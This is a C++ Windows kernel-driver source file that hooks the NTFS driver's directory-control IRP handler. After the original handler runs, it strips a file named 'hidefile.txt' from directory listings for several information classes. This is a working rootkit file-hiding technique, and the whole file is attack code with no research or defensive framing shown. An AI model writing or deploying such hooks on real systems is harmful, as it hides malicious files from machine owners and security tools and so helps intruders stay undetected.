#include "NtfsIRPHooks.h"


NTSTATUS HookDirectoryControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp)
{
	auto hookData = NtfsIRPManager::getInstance().FindHook(HookDirectoryControl);	

	auto pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	auto listDirBuffer = pIrp->UserBuffer;
	auto infoClass = pIrpStack->Parameters.QueryDirectory.FileInformationClass;
    wchar_t fileName[] = L"hidefile.txt";

	BOOLEAN captured;

    if (pIrpStack->MajorFunction == IRP_MJ_DIRECTORY_CONTROL &&
        pIrpStack->MinorFunction == IRP_MN_QUERY_DIRECTORY &&
        KeGetCurrentIrql() == PASSIVE_LEVEL &&
        (infoClass == FileDirectoryInformation ||
            infoClass == FileFullDirectoryInformation ||
            infoClass == FileBothDirectoryInformation ||
            infoClass == FileNamesInformation ||
            infoClass == FileIdBothDirectoryInformation ||
            infoClass == FileIdFullDirectoryInformation)) 
    {
        captured = TRUE;
    }
    else 
    {
        captured = FALSE;
    }

    auto status = hookData.OriginalFunc(pDeviceObject, pIrp);

    if (!captured ||
        !NT_SUCCESS(status) ||
        !pIrp->IoStatus.Information) 
    {
        
        return status;
    }

    auto newListDirLength = pIrp->IoStatus.Information;

    switch (infoClass) {
    case FileDirectoryInformation:
        FilterListDir<FILE_DIRECTORY_INFORMATION>(listDirBuffer, pIrp->IoStatus.Information, (PWCHAR)fileName, newListDirLength);
        break;
    case FileFullDirectoryInformation:
        FilterListDir<FILE_FULL_DIR_INFORMATION>(listDirBuffer, pIrp->IoStatus.Information, fileName, newListDirLength);
        break;
    case FileBothDirectoryInformation:
        FilterListDir<FILE_BOTH_DIR_INFORMATION>(listDirBuffer, pIrp->IoStatus.Information, fileName, newListDirLength);
        break;
    case FileNamesInformation:
        FilterListDir<FILE_NAMES_INFORMATION>(listDirBuffer, pIrp->IoStatus.Information, fileName, newListDirLength);
        break;
    case FileIdBothDirectoryInformation:
        FilterListDir<FILE_ID_BOTH_DIR_INFORMATION>( listDirBuffer, pIrp->IoStatus.Information, fileName, newListDirLength);
        break;
    case FileIdFullDirectoryInformation:
        FilterListDir<FILE_ID_FULL_DIR_INFORMATION>( listDirBuffer, pIrp->IoStatus.Information, fileName, newListDirLength);
        break;
    }


    return status;
}
